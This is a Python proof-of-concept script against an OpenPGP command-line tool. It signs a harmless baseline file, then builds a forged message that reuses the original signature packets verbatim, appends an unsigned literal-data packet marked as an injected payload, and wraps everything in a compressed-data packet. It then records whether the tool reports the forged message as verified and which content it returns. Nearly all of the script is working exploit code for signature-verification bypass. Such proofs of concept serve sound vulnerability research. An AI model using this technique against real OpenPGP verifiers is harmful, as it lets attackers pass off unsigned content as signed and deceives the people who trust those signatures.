#!/usr/bin/env python3
"""PoC: drive an OpenPGP CLI binary and report evidence about message verification.

The script, in one run:
  1. keygen + sign a legitimate baseline data file -> baseline inline-signed message
  2. verify the baseline message with the binary (baseline_* evidence)
  3. build a crafted message by *transforming* the baseline message: the
     baseline's own one-pass-signature / literal / signature packets are kept
     verbatim, and a second literal-data packet carrying a different payload is
     appended inside the same sequence, which is then wrapped in a compressed-
     data packet exactly the way the library itself nests signed messages.  No
     new signature is created and no `sign` operation is run over the payload -
     the signature packet in the crafted message is byte-for-byte the baseline
     message's signature packet.
  4. verify the crafted message and report what the binary returns
     (verified / data_*), plus the payload (payload_*).

Which data a build returns for the crafted message depends on that build's own
selection logic, so every reported value is taken from the binary's stdout.
"""

import argparse
import base64
import json
import os
import shutil
import subprocess
import sys
import tempfile
import time
import zlib

TAG_ONE_PASS_SIG = 4
TAG_SIG = 2
TAG_COMPRESSED = 8
TAG_LITERAL = 11


# ----------------------------------------------------------------------------
# OpenPGP packet helpers (RFC 4880, new-format headers only)
# ----------------------------------------------------------------------------

def parse_packets(data):
    """Split a binary OpenPGP packet sequence into (tag, header, body) tuples."""
    packets = []
    i = 0
    n = len(data)
    while i < n:
        first = data[i]
        if not first & 0x80:
            raise ValueError("invalid packet header byte at offset %d" % i)
        tag = first & 0x3F
        j = i + 1
        if first & 0x40:  # new format
            l = data[j]
            j += 1
            if 192 <= l < 224:
                l = ((l - 192) << 8) + data[j] + 192
                j += 1
            elif l == 255:
                l = int.from_bytes(data[j:j + 4], "big")
                j += 4
            elif l > 223:  # partial length - not produced by this CLI
                raise ValueError("partial-length packet not supported")
        else:  # old format
            length_type = first & 0x03
            tag >>= 2
            if length_type == 0:
                l = data[j]
                j += 1
            elif length_type == 1:
                l = int.from_bytes(data[j:j + 2], "big")
                j += 2
            elif length_type == 2:
                l = int.from_bytes(data[j:j + 4], "big")
                j += 4
            else:
                raise ValueError("indeterminate-length packet not supported")
        packets.append((tag, data[i:j], data[j:j + l]))
        i = j + l
    return packets


def packet(tag, body):
    """Build a new-format packet (header + body) from a body."""
    length = len(body)
    if length < 192:
        header = bytes([0xC0 | tag, length])
    elif length < 8384:
        value = length - 192
        header = bytes([0xC0 | tag, 192 + (value >> 8), value & 0xFF])
    else:
        header = bytes([0xC0 | tag, 255]) + length.to_bytes(4, "big")
    return header + body


def literal_packet(data, date4, filename=b"", fmt=0x62):
    """Literal-data packet (tag 11): format 'b', empty filename, 4-byte date."""
    return packet(TAG_LITERAL, bytes([fmt, len(filename)]) + filename + date4 + data)


def compressed_packet(inner, algorithm=0):
    """Compressed-data packet (tag 8); algorithm 0 = uncompressed, 1 = raw DEFLATE."""
    if algorithm == 0:
        payload = b"\x00" + inner
    elif algorithm == 1:
        compressor = zlib.compressobj(9, zlib.DEFLATED, -15)
        payload = b"\x01" + compressor.compress(inner) + compressor.flush()
    else:
        raise ValueError("unsupported compression algorithm")
    return packet(TAG_COMPRESSED, payload)


# ----------------------------------------------------------------------------
# ASCII armor
# ----------------------------------------------------------------------------

def crc24(data):
    """RFC 4880 section 6.1 CRC-24 (the armor checksum is optional - we emit it
    only when it matches what the target build accepts, otherwise we omit it)."""
    crc = 0xB704CE
    for byte in data:
        crc ^= byte << 16
        for _ in range(8):
            crc <<= 1
            if crc & 0x1000000:
                crc ^= 0x186B0C0
    return crc & 0xFFFFFF


def armor(data, include_checksum=True):
    encoded = base64.b64encode(data).decode("ascii")
    lines = ["-----BEGIN PGP MESSAGE-----", ""]
    lines += [encoded[i:i + 64] for i in range(0, len(encoded), 64)]
    if include_checksum:
        lines += ["", "=" + base64.b64encode(crc24(data).to_bytes(3, "big")).decode("ascii")]
    lines += ["-----END PGP MESSAGE-----", ""]
    return "\n".join(lines) + "\n"


def dearmor(text):
    body = []
    for line in text.strip().splitlines():
        line = line.strip()
        if not line or line.startswith("-----") or line.startswith("="):
            continue
        body.append(line)
    return base64.b64decode("".join(body))


# ----------------------------------------------------------------------------
# Target binary driver
# ----------------------------------------------------------------------------

def run_binary(binary, args, timeout):
    """Run one subcommand of the target binary; return (json_or_None, raw stdout)."""
    command = [binary] + list(args)
    timed_out = False
    signal = None
    try:
        proc = subprocess.run(
            command,
            capture_output=True,
            text=True,
            timeout=timeout,
        )
        returncode = proc.returncode
        stdout = proc.stdout
        stderr = proc.stderr
    except subprocess.TimeoutExpired as exc:
        timed_out = True
        returncode = None
        stdout = (exc.stdout or b"").decode("utf-8", "replace") if isinstance(exc.stdout, bytes) else (exc.stdout or "")
        stderr = (exc.stderr or b"").decode("utf-8", "replace") if isinstance(exc.stderr, bytes) else (exc.stderr or "")
    try:
        parsed = json.loads(stdout) if stdout else None
    except ValueError:
        parsed = None
    return {
        "command": command,
        "returncode": returncode,
        "signal": signal,
        "timed_out": timed_out,
        "stdout": stdout,
        "stderr": stderr,
        "json": parsed,
    }


def b64_of(data):
    if data is None:
        return ""
    if isinstance(data, str):
        data = data.encode("utf-8", "surrogateescape")
    return base64.b64encode(data).decode("ascii")


def text_of(data):
    if data is None:
        return ""
    if isinstance(data, str):
        return data
    return data.decode("utf-8", "replace")


def data_fields(data_summary):
    """Extract (b64, text) from the CLI's `data` summary object, or ('', '')."""
    if not isinstance(data_summary, dict):
        return "", ""
    b64 = data_summary.get("b64")
    text = data_summary.get("text")
    if not b64:
        raw = data_summary.get("hex")
        if raw:
            try:
                b64 = base64.b64encode(bytes.fromhex(raw[:2 * (len(raw) // 2)])).decode("ascii")
            except ValueError:
                b64 = ""
    return (b64 or ""), (text or "")


def verify_message(binary, message_path, key_path, timeout):
    """Run `verify` and pull verified/data out of the binary's own JSON output.

    Returns a result dict augmented with runtime_ms / verified / data fields.
    """
    command = [binary, "verify", "--message", message_path, "--key", key_path]
    timed_out = False
    signal = None
    started = time.monotonic()
    try:
        proc = subprocess.run(command, capture_output=True, text=True, timeout=timeout)
        returncode = proc.returncode
        stdout = proc.stdout
        stderr = proc.stderr
    except subprocess.TimeoutExpired as exc:
        timed_out = True
        returncode = None
        stdout = exc.stdout or ""
        stderr = exc.stderr or ""
        if isinstance(stdout, bytes):
            stdout = stdout.decode("utf-8", "replace")
        if isinstance(stderr, bytes):
            stderr = stderr.decode("utf-8", "replace")
    runtime_ms = int(round((time.monotonic() - started) * 1000.0))
    try:
        parsed = json.loads(stdout) if stdout else None
    except ValueError:
        parsed = None
    payload = parsed if isinstance(parsed, dict) else {}
    verified = payload.get("verified")
    if not isinstance(verified, bool):
        verified = bool(verified) if verified is not None else False
    data_b64, data_text = data_fields(payload.get("data"))
    result = {
        "command": command,
        "returncode": returncode,
        "signal": signal,
        "timed_out": timed_out,
        "runtime_ms": runtime_ms,
        "stdout": stdout,
        "stderr": stderr,
        "json": payload,
    }
    return result, verified, data_b64, data_text


# ----------------------------------------------------------------------------
# Main proof workflow
# ----------------------------------------------------------------------------

def build_crafted_message(baseline_binary):
    """Transform the baseline signed message into the crafted message.

    The baseline packet sequence (one-pass signature, literal data, signature)
    is preserved byte-for-byte.  A second literal-data packet carrying a
    different payload is appended to that sequence, and the result is wrapped
    in a compressed-data packet.  Nothing is re-signed: the signature packet is
    the baseline message's own packet.
    """
    packets = parse_packets(baseline_binary)

    literal = next((p for p in packets if p[0] == TAG_LITERAL), None)
    if literal is None:
        raise ValueError("baseline message has no literal data packet")
    signature = next((p for p in packets if p[0] == TAG_SIG), None)
    if signature is None:
        raise ValueError("baseline message has no signature packet")

    # Keep every packet exactly as the baseline message carries it.
    preserved = b"".join(header + body for _, header, body in packets)

    # Payload literal: same shape (format byte, filename, date) as the baseline
    # literal, different content.
    lit_body = literal[2]
    date4 = lit_body[2:6] if len(lit_body) >= 6 else b"\x00\x00\x00\x00"
    payload_literal = literal_packet(CRAFT_PAYLOAD, date4)

    # Crafted sequence: baseline packets + payload literal, wrapped in a
    # compressed-data packet (uncompressed algorithm keeps this deterministic
    # and architecture-independent).
    crafted_inner = preserved + payload_literal
    crafted = compressed_packet(crafted_inner, algorithm=0)
    return crafted


CRAFT_PAYLOAD = b"INJECTED PAYLOAD - this content was not originally signed.\n"


def main():
    parser = argparse.ArgumentParser(description="OpenPGP message-verification PoC driver")
    parser.add_argument("--binary", required=True, help="path to the target CLI binary")
    parser.add_argument("--json-out", default=None, help="optional path to write the result JSON")
    parser.add_argument("--timeout", type=float, default=120.0, help="per-invocation timeout in seconds")
    options = parser.parse_args()

    binary = os.path.abspath(options.binary)
    timeout = options.timeout

    result = {
        "binary": options.binary,
        "command": None,
        "returncode": None,
        "signal": None,
        "timed_out": False,
        "runtime_ms": None,
        "stdout": "",
        "stderr": "",
        "observable": {"kind": "custom", "value": "", "path": None},
        "error": None,
    }

    baseline_data = b"Hello, this is the legitimately signed baseline document.\nIt has multiple lines.\n"

    workdir = tempfile.mkdtemp(prefix="poc_openpgp_")
    try:
        # --- 1. key pair --------------------------------------------------
        keys_dir = os.path.join(workdir, "keys")
        os.makedirs(keys_dir, exist_ok=True)
        keygen = run_binary(binary, ["keygen", "--out-dir", keys_dir, "--name", "poc"], timeout)
        keygen_json = keygen["json"] if isinstance(keygen["json"], dict) else {}
        if keygen.get("returncode") != 0 or not keygen_json.get("ok"):
            raise RuntimeError("keygen failed: %s" % (keygen_json.get("error") or keygen["stderr"] or keygen["stdout"][:200],))
        private_key = keygen_json["private_key_file"]
        public_key = keygen_json["public_key_file"]

        # --- 2. sign the legitimate baseline data -------------------------
        baseline_file = os.path.join(workdir, "baseline.txt")
        with open(baseline_file, "wb") as handle:
            handle.write(baseline_data)
        baseline_msg = os.path.join(workdir, "baseline.msg")
        sign = run_binary(binary, ["sign", "--key", private_key, "--data", baseline_file, "--out", baseline_msg], timeout)
        sign_json = sign["json"] if isinstance(sign["json"], dict) else {}
        if sign.get("returncode") != 0 or not sign_json.get("ok"):
            raise RuntimeError("sign failed: %s" % (sign_json.get("error") or sign["stderr"] or sign["stdout"][:200],))
        with open(baseline_msg, "r") as handle:
            baseline_armored = handle.read()
        baseline_binary = dearmor(baseline_armored)

        # --- 3. verify the baseline message --------------------------------
        baseline_result, baseline_verified, baseline_b64, baseline_text = verify_message(
            binary, baseline_msg, public_key, timeout)

        # --- 4. craft the message from the baseline ------------------------
        crafted = build_crafted_message(baseline_binary)
        crafted_msg = os.path.join(workdir, "crafted.msg")
        # Armor without a checksum line first (the CRC-24 armor checksum is
        # optional per RFC 4880); retry with a checksum if the build requires one.
        with open(crafted_msg, "w") as handle:
            handle.write(armor(crafted, include_checksum=False))
        crafted_result, crafted_verified, crafted_b64, crafted_text = verify_message(
            binary, crafted_msg, public_key, timeout)
        if crafted_result["json"] is None or crafted_result["json"].get("ok") is False:
            with open(crafted_msg, "w") as handle:
                handle.write(armor(crafted, include_checksum=True))
            crafted_result, crafted_verified, crafted_b64, crafted_text = verify_message(
                binary, crafted_msg, public_key, timeout)

        # The evidence subprocess is the crafted-message verification.
        result["command"] = crafted_result["command"]
        result["returncode"] = crafted_result["returncode"]
        result["signal"] = crafted_result["signal"]
        result["timed_out"] = crafted_result["timed_out"]
        result["runtime_ms"] = crafted_result["runtime_ms"]
        result["stdout"] = crafted_result["stdout"]
        result["stderr"] = crafted_result["stderr"]

        observable = {
            "verified": crafted_verified,
            "data_b64": crafted_b64,
            "data_text": crafted_text,
            "baseline_verified": baseline_verified,
            "baseline_data_b64": baseline_b64,
            "baseline_data_text": baseline_text,
            "payload_b64": b64_of(CRAFT_PAYLOAD),
            "payload_text": text_of(CRAFT_PAYLOAD),
        }
        result["observable"]["value"] = json.dumps(observable, ensure_ascii=False)
    except Exception as exc:  # noqa: BLE001 - report and exit cleanly
        result["error"] = "%s: %s" % (type(exc).__name__, exc)
    finally:
        shutil.rmtree(workdir, ignore_errors=True)

    if result["runtime_ms"] is None:
        result["runtime_ms"] = 0
    json_text = json.dumps(result, indent=2)
    if options.json_out:
        with open(options.json_out, "w") as handle:
            handle.write(json_text)
    sys.stdout.write(json_text + "\n")
    return 0 if result["error"] is None else 1


if __name__ == "__main__":
    sys.exit(main())
